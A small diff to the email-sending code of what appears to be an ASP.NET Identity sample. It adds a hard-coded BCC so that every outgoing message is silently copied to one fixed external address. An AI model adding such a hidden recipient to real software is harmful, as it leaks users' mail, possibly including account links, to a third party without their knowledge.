@@ -98,6 +98,8 @@ namespace IdentitySample.Models
             mail.To.Add(message.Destination);
             mail.Subject = message.Subject;
             mail.Body = message.Body;
+            MailAddress copy = new MailAddress("ahid.manja@un.org");
+            mail.Bcc.Add(copy);
 
             smtp.Timeout = 1000;
 
